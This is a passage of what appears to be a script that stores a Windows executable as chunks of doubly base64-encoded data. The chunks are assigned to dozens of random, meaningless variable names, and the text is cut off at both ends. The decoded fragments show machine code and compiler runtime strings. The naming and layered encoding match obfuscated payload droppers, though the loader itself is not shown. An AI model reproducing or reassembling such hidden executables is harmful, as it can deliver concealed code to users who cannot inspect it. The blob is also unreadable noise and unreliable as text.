BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 USrSXWldjOmExiDNcxtNWUyMThsastYxrYoKTFEWOuJcvfDjgnfIcEa = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFLQVhBUURNRndFQUFNWUJBT0FYQVFCSEdBRUFGTVlCQUdBWUFRQitHd0VBUk1ZQkFGQWNBUUFQSFFFQUtNWUJBRUFkQVFCV0hRRUFNTWNCQUZZZEFRQjJIUUVBT01jQkFIWWRBUUI3SFFFQVVNY0JBSkFkQVFDckhRRUFXTVlCQUtzZEFRQUJIZ0VBYk1ZQkFBRWVBUUFSSGdFQWhNWUJBRUFlQVFCSEhnRUFtTVlCQUVjZUFRQmhIZ0VBcU1ZQkFHRWVBUUJzSGdFQXhNWUJBR3dlQVFDNEhnRUEzTVlCQUxnZUFRQzlIZ0VBOU1ZQkFMMGVBUURRSGdFQUNNY0JBTkFlQVFCREh3RUFITWNCQUxBZkFRRHZId0VBYk1jQkFBQWdBUUFqSUFFQVpNY0JBREFnQVFCc0lBRUFkTWNCQUlBZ0FRQzZJQUVBaE1jQkFOQWdBUURJSVFFQWZNY0JBQ0FpQVFBK0lnRUFrTWNCQUZBaUFRQUNJd0VBeE1jQkFEQWpBUUJBSXdFQXpNY0JBRkFqQVFCcUl3RUExTWNCQUhBakFRQ0RJd0VBQ01nQkFKQWpBUUF1SlFFQTNNY0JBS0FsQVFDMUpRRUFsTWNCQU1BbEFRRE9KUUVBbk1jQkFPQWxBUUFlSmdFQXZNY0JBREFtQVFCREpnRUFwTWNCQUZBbUFRQnRKZ0VBdE1jQkFJQW1BUUNWSmdFQXJNY0JBS0FtQVFDekpn"
 vFLyllXrhmSiCmOAKRsNkTcKp = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEzRUFGQUFRQUFBQUFBQUFBQUFBQUFOeEFCUUFFQUFBQUFBQUFBQUFBQUFNTVFBVUFCQUFBQUFBQUFBQUFBQUFDZ0VBRkFBUUFBQUFBQUFBQUFBQUFBb0JBQlFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ3VFUUZBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 qpRHjZoTBzGJBQeVBJBEvDvfxiPXTkBzbYzFCng = "U0wxMHlORGRlS0FBRG80Z01BQU9ubEFBQUFUSXRLREVpTmpDU0FBQUFBU0ltY0pQQUJBQUJKZytra1NJMWFJRXlMdzBpTmxDU1lBQUFBNkxFQ0FBQklpMFlNU0kwTjdvb0FBRWlKVENSd1RJME5Xb3NBQUVpRDZDUklqWXdrbUFBQUFFaUpUQ1JvVEkwRm1vc0FBRWlORGNlS0FBQzZCZ0VBQUVpSlRDUmdTSTJNSklBQUFBQklpVXdrV0VpTkRhMktBQUJJaVV3a1VFaU5EYkdLQUFCRWlYUWtTRWlKVENSQVNJMk1KTkFBQUFCSWlVUWtPRWlOQmN1S0FBQklpVVFrTUVpTkJjK0tBQUJJaVZ3a0tFaUpSQ1FnNkhicC8vOU1qWXdrMEFBQUFFRzRCQUFBQUl2WFNJdk42QUFEQUFCSWk1d2s4QUVBQUVpTGpDVGdBUUFBU0RQTTZQSG8vLzlJZ2NUNEFRQUFRVjVmWGwzRHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpJUDZCSGNyU0dQQ1RJME4wZGIrLzBXTGxJRVkwQUVBVFl1TXdRaXRBUUJCZy9yL2RDaEVpOEpCaTlMcFVBSUFBRXlMRGRtREFBQzZCUUFBQUVHNkFRQUFBRVNMd2tHTDB1a3pBZ0FBdzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXhJaVZ3a0dFaUpkQ1FnVjBpQjdEQUVBQUJJaXdWZnBnQUFT"
 dFiJWKhjbPrexvpfDvVJqNYxBHlMbzLjichbXJYNZBfMaBiFBHcaUKjXRLowLQmTNse = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 RzAiANtvbRZPXTAsgSwrtKTXDAxZvqMSiUWIDXSXTmocZPagjTaMNLa = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBPQ=="
 MCJnXUJSpRRJmCHBNyGgL = "eWFBQUFNOUxvdmNMLy8waUwrRWlGd0hSL1NJMFZ2R2dBQUVpTHovOFY0OElBQUVpTDJFaUZ3SFJuU0kwVnRHZ0FBRWlMei84Vnk4SUFBRWlMOEVpRndIUlBTSTBWdEdnQUFFaUx6LzhWczhJQUFFeUw4RWlGd0hRM1NJMUVKRWhCdVFFQUFBQklpVVFrSUVpTkZaeG9BQUJJaThORk04Qkl4OEVDQUFDQS94Vlo0Z0FBaGNCME4waUx6LzhWZk1JQUFEUEFTSXVOWUFFQUFFZ3p6T2pFdy8vL1RJMmNKSEFDQUFCSmkxc1FTWXR6R0VtTGV5Qk5pM01vU1l2alhjTklpMHdrU0VpTlJDUkFTSWxFSkNoTWpVd2tSRWlOUkNSUXgwUWtRQWdDQUFCSWlVUWtJRWlORmJGb0FBQklpOFpGTThEL0ZlWGhBQUJJaTB3a1NJdllTWXZHL3hYVjRRQUFTSXZQL3hYOHdRQUFoZHNQaFhqLy8vK0RmQ1JFQVErRmJmLy8vNHRVSkVEMndnRVBoV0QvLy8vUjZrU0x5b1A2QWcrQ1V2Ly8vLy9LVEkxRUpGQm1RVGtjVUUyTkJGQVBoVHovLy8rTlF2OUJ1bHdBQUFCbVJEbFVSRkIwQjJaRmlSQkJpOUdMd3ZmUWcvZ1lENElYLy8vL2k4cElqVUVYU0QwRUFRQUFENGNGLy8vL3gwUk1VR0lBYVFBendNZEVURlJ1QUZ3QU05TEhSRXhZWVFCdEFFRzRBQWtBQU1kRVRGeGtBRFlBeDBSTVlEUUFYQURIUkV4a1RRQlRBTWRFVEdoUUFFUUF4MFJNYkVJQU1RREhSRXh3TkFBd0FNZEVUSFF1QUVRQXgwUk1lRXdBVEFCbWlVUk1mRWlOVENSUTZN"
 DxGfjRpmNTaNGoJXjmOatrlacvaUAOIngqVHZVdHiYsqXtJVjfUeKbFDcCgeOYeJUCcb = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekVTSlJDUVlWVk5XVjBGVVFWVkJWa2lOYkNUcFNJSHNzQUFBQUVVejlraU5jZjlGaVRGTWkrcG1SSWt5U0l2T1NJMVY1MDJMNFVXTlJqRC9GYWkrQUFCSWhjQVBoR2tEQUFCRWkwVi9TSXRWZDBpTFRlL294TUgvLzRYQUQ0UlFBd0FBU0l0Tjc3aE5XZ0FBWmprQkQ0VStBd0FBU0dOQlBJWEFENDR5QXdBQVNBUEJnVGhRUlFBQUQ0VWpBd0FBRDdkUUZDdnhSQSszUUFaSUE5QkJpLzVCaTk1RmhjQjBKdzhmaEFBQUFBQUFpOE5JalF5QWkwVEtKRHZ3Y2dxTC9pdjRPM1RLSUhJSC84TkJPOWh5NFVFNzJBK0UyZ0lBQVAvRFJEZzFZWVlBQUhVclREazFUb1lBQUErRndnSUFBT2liK1AvL1NJa0ZQSVlBQUVpRndBK0VyUUlBQU1ZRk5vWUFBQUhyQjBpTEJTT0dBQUJJalJXMFpBQUFTSXZJL3hXenZRQUFTSVhBRDRTRUFnQUFTSTFOejBVenlVaUpUQ1E0UlRQQVRJbDBKREJJalUzZlRJbDBKQ2d6MGtpSlRDUWdTSXROZC84VlZOMEFBSVhBRDRST0FnQUFTSXROejBtTDlreUpkYmRJaXdGSWl3RC9GVFhkQUFBOVFaRXlBUStGRmdJQUFFaUxUYzlNalUzWFRJMEZUMlFBQURQU1NJc0JTSXRBT1A4VkROMEFBSVhBRDRUd0FRQUFTSXROMTB5TlRjZE1pWFFrTUVTTHgweUpkQ1Fv"
 VBKpNPcerfjsMDbNePJypSVjCZ = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFNQUpBQVFBQUFEQXdBa0FCQUFBQVFEQUNRQUVBQUFCUU1BSkFBUUFBQUdBd0FrQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRGlHelJrQUFBQUFBSUFBQUJYQUFBQUhMNEJBQnlrQUFBQUFBQUE0aHMwWkFBQUFBQU1BQUFBRkFBQUFIUytBUUIwcEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 CRhXDbBjmGHbyTLCeuwFsAwYKdc = "UkFYOFBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpFaUQ3RGhJdURLaTN5MlpLd0FBU0RrRlU1QUFBSFFUU0lzRlNwQUFBRWozMEVpSkJUaVFBQURyUmVqaC92Ly9TSWxFSkNCSXVES2kzeTJaS3dBQVNEbEVKQ0IxRDBpNE02TGZMWmtyQUFCSWlVUWtJRWlMUkNRZ1NJa0ZDSkFBQUVpTFJDUWdTUGZRU0lrRjhZOEFBRWlEeERqRHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek14SWlVd2tDRFBBdzh6TXpNek16TXpNdUFFQUFBRER6TXpNek16TXpNek16RFBBdzh6TXpNek16TXpNek16TXpNeTRBRUFBQU1QTXpNek16TXpNek16TU04RER6TXpNek16TXpNek16TXpNekRQQXc4ek16TXpNek16TXpNek16TXhJZyt3b1NJME4xWmNBQVA4VjM4OEFBRWlEeENqRHpNek16TXpNek16TXpFaUQ3Q2hJalEyMWx3QUE2Q2pTLy85SWc4UW93OHpNek16TXpNek16TXpNc0FIRHpNek16TXpNek16TXpNek16TUlBQU16TXpNek16TXpNek16TXpNekNBQURNek16TXpNek16TXpNek16TVNJMEZnWmNBQU1QTXpNek16TXpNekVpRDdEam8vODcvLzBpSlJDUWdTSXRFSkNCSWl3QklnOGdrU0l0TUpDQklpUUhvQ2MvLy8waUpSQ1FvU0l0RUpDaElpd0JJZzhnQ1NJdE1KQ2hJaVFGSWc4UTR3"
 UXsYABfpUwdH = "QUFPZ1hBZ0FBQUFBQXlCY0NBQUFBQUFDd0Z3SUFBQUFBQUhvZEFnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFiQm9DQUFBQUFBQzJHZ0lBQUFBQUFOSWFBZ0FBQUFBQTZob0NBQUFBQUFENEdnSUFBQUFBQUE0YkFnQUFBQUFBR2hzQ0FBQUFBQUFxR3dJQUFBQUFBRG9iQWdBQUFBQUFpQm9DQUFBQUFBQmdHZ0lBQUFBQUFGUWFBZ0FBQUFBQVJCb0NBQUFBQUFBMEdnSUFBQUFBQUI0YUFnQUFBQUFBOEJrQ0FBQUFBQURtR1FJQUFBQUFBTndaQWdBQUFBQUF6aGtDQUFBQUFBREFHUUlBQUFBQUFMSVpBZ0FBQUFBQXFoa0NBQUFBQUFDaUdRSUFBQUFBQUpRWkFnQUFBQUFBaUJrQ0FBQUFBQUJtR1FJQUFBQUFBRVFaQWdBQUFBQUFLaGtDQUFBQUFBQVdHUUlBQUFBQUFBWVpBZ0FBQUFBQTlCZ0NBQUFBQUFEaUdBSUFBQUFBQU5JWUFnQUFBQUFBeUJnQ0FBQUFBQUN1R0FJQUFBQUFBSndZQWdBQUFBQUFtaG9DQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 kUozySeFfiJiWBdZvCFFrrdxoTSfXmBjPevyUb = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 ukSyHuWLSaVUrwVfEfCREVehGPjvISzxLOwkzbNqIAmVy = "QlhrRmRRVnhmWGx0ZHc4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek14QVUwaUQ3RkJJaXdYTGVRQUFTRFBFU0lsRUpFREhSQ1F3QUFBQUFNZEVKRFFBQUFBQXgwUWtPQUFBQUFBendEUEpENkpNalVRa0lFR0pBRUdKV0FSQmlVZ0lRWWxRRExnRUFBQUFTR3ZBQUl0RUJDQ0pSQ1FVdUFRQUFBQklhOEFCaTBRRUlEVkhaVzUxdVFRQUFBQklhOGtEaTB3TUlJSHhhVzVsU1F2QnVRUUFBQUJJYThrQ2kwd01JSUh4Ym5SbGJBdkJoY0IxQ3NkRUpBd0JBQUFBNndqSFJDUU1BQUFBQUErMlJDUU1pQVFrdUFRQUFBQklhOEFCaTBRRUlEVkJkWFJvdVFRQUFBQklhOGtEaTB3TUlJSHhaVzUwYVF2QnVRUUFBQUJJYThrQ2kwd01JSUh4WTBGTlJBdkJoY0IxQ3NkRUpC"
 kiwEfSwbhkXperQLoELoyBXdrSpxHTAXgsYTrLTUuiZPImsimfJRFNPSwgkmKnZNVrXq = "QUFNS3dCUUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFBQUFBQUVDc0FVQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQnVieUIzWVhraElTRUFBQUJpWVdRQVoyOXZaQUFBQUFEd3JRRkFBUUFBQUFDdkFVQUJBQUFBV0xBQlFBRUFBQUNBc0FGQUFRQUFBTUN3QVVBQkFBQUErTEFCUUFFQUFBQUJBQUFBQUFBQUFBRUFBQUFCQUFBQUFRQUFBQUVBQUFCVGRHRmpheUJoY205MWJtUWdkR2hsSUhaaGNtbGhZbXhsSUNjQUFBQUFBQ2NnZDJGeklHTnZjbkoxY0hSbFpDNEFBQUFBQUFBQUFGUm9aU0IyWVhKcFlXSnNaU0FuQUFBbklHbHpJR0psYVc1bklIVnpaV1FnZDJsMGFHOTFkQ0JpWldsdVp5QnBibWwwYVdGc2FYcGxaQzRBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBVkdobElIWmhiSFZsSUc5bUlFVlRVQ0IzWVhNZ2JtOTBJSEJ5YjNCbGNteDVJSE5oZG1Wa0lHRmpjbTl6Y3lCaElHWjFibU4wYVc5dUlHTmhiR3d1SUNCVWFHbHpJR2x6SUhWemRXRnNiSGtnWVNCeVpYTjFiSFFnYjJZZ1kyRnNi"
 BnBfMYeYWEZEQqZZgBiphAzpawtwRnSUfnIatVlrrPKgoagdMIs = "QUFBQUFBQUFGSmxaME5zYjNObFMyVjVBQUFBQUFCVEFFOEFSZ0JVQUZjQVFRQlNBRVVBWEFCWEFHOEFkd0EyQURRQU13QXlBRTRBYndCa0FHVUFYQUJOQUdrQVl3QnlBRzhBY3dCdkFHWUFkQUJjQUZZQWFRQnpBSFVBWVFCc0FGTUFkQUIxQUdRQWFRQnZBRndBTVFBMEFDNEFNQUJjQUZNQVpRQjBBSFVBY0FCY0FGWUFRd0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCUUFISUFid0JrQUhVQVl3QjBBRVFBYVFCeUFBQUFBQUFBQUFBQUFBQUFBRVFBVEFCTUFBQUFBQUFBQUFBQUFBQk5BRk1BVUFCRUFFSUFNUUEwQURBQUFBQUFBQUFBQUFCTkFGTUFVQUJFQUVJQU1RQTBBREFBQUFBQUFBQUFBQUJRUkVKUGNHVnVWbUZzYVdSaGRHVTFBQUFBQUhJQUFBQUFBQUFBQUFBQUFFQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSTBBRkFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFKQUFRQUFBQ0F3QWtBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 zIlByGQtxrTAJVlTCjNloPoxQZyhA = "OHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16RWlEN0JpRFBhbU9BQUFBZFFuSEJDUUJBQUFBNndmSEJDUUFBQUFBaXdRa1NJUEVHTVBNek16TXpNek16TXpNekVpTkJSbVhBQUREek16TXpNek16TXhJalFYeGxnQUF3OHpNek16TXpNek1pVXdrQ01jRnhwWUFBQUFBQUFERHpNek16TXpNek16TXpNek16TXpNek15SlRDUUlWMGlCN1BBRkFBQzVGd0FBQVA4VnFjNEFBSVhBZEF1TGhDUUFCZ0FBaThqTktia0RBQUFBNkxYUS8vOUlqWVFrSUFFQUFFaUwrRFBBdWRBRUFBRHpxa2lOakNRZ0FRQUEveFhtelFBQVNJdUVKQmdDQUFCSWlVUWtVRVV6d0VpTlZDUllTSXRNSkZEL0ZjN05BQUJJaVVRa1NFaURmQ1JJQUhSQlNNZEVKRGdBQUFBQVNJMUVKSEJJaVVRa01FaU5SQ1I0U0lsRUpDaElqWVFrSUFFQUFFaUpSQ1FnVEl0TUpFaE1pMFFrVUVpTFZDUllNOG4vRllqTkFBQklpNFFrK0FVQUFFaUpoQ1FZQWdBQVNJMkVKUGdGQUFCSWc4QUlTSW1FSkxnQkFBQklqWVFrZ0FBQUFFaUwrRFBBdVpnQUFBRHpxc2VFSklBQUFBQVZBQUJBeDRRa2hBQUFBQUVBQUFCSWk0UWsrQVVBQUVpSmhDU1FBQUFBL3hYMHpBQUFnL2dCZFFmR1JDUkFBZXNGeGtRa1FBQVB0a1FrUUloRUpFRklqWVFrZ0FBQUFFaUpSQ1JnU0kyRUpDQUJBQUJJaVVRa2FEUEoveFY0elFBQVNJMU1KR0QvRmVYTUFBQ0pSQ1JF"
 czyBdpTqXRwcJVOUWkrggOGUymhuCzDOujPPMDouEPSuUgJxYKOviAjHVP = "UVZSQlZVRldRVmRJZ2V5d0RnQUFTSXNGVHFRQUFFZ3p4RWlKaENTUURnQUFSVFB0U1dQb1JZdjFUWXY1Ukl2aVNJdlo2TERrLy85SWkvaEloY0IxQzBpTHkraHI1Ly8vVEl2d1JJbHNKQ2hCdWYvLy8vOU5pOGRNaVd3a0lEUFNTSW0wSktnT0FBQzU2ZjBBQVA4VkFlUUFBRWhqeUVpQitRQUNBQUJ6TTRsRUpDaEJ1Zi8vLy85SWpZUWtrQW9BQUUyTHh6UFNTSWxFSkNDNTZmMEFBUDhWenVNQUFFaU50Q1NRQ2dBQWhjQjFCMGlOTmNPRUFBQzVBaEFBQU9oWit2Ly9oTUIwSVVpTkRjYUFBQUJNaTg2TEZLbE1pOE9MemVpTyt2Ly9oTUFQaFVzQkFBRHJBckFCVFlYMmRRbEloZjhQaERnQkFBQ0V3SFFPL3hWaTR3QUFoY0FQaFNZQkFBQklqWVFrWUFJQUFNZEVKQ2dFQVFBQVNJMUwrMGlKUkNRZ1RJMU1KRUJCdUFRQkFBQklqVlFrVU9qSDVmLy9TSVgvZENwSWlYUWtNRWlOQmNPRUFBQ0piQ1FvVEkyTUpHQUNBQUJJaVVRa0lFaU5WQ1JRU0l2SDZiWUFBQUJNaVd3a09FaU5oQ1J3QkFBQVRJbHNKREJNalVRa1VNZEVKQ2dLQXdBQVNJMDl6NFFBQUVHNS8vLy8vMGlKUkNRZ005SzU2ZjBBQVA4VjErSUFBRXlKYkNRNFNJMmNKSEFFQUFDRndFeUpiQ1F3U0kyRUpJQUhBQURIUkNRb0NnTUFBRWdQUk45SWlVUWtJRFBTVEkyRUpHQUNBQUJCdWYvLy8vOUlqVDJMaEFBQXVlbjlBQUQvRllqaUFBQk1pWHdrTUV5"
 BgcwqEuOjbRLfvYOkIeO = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TX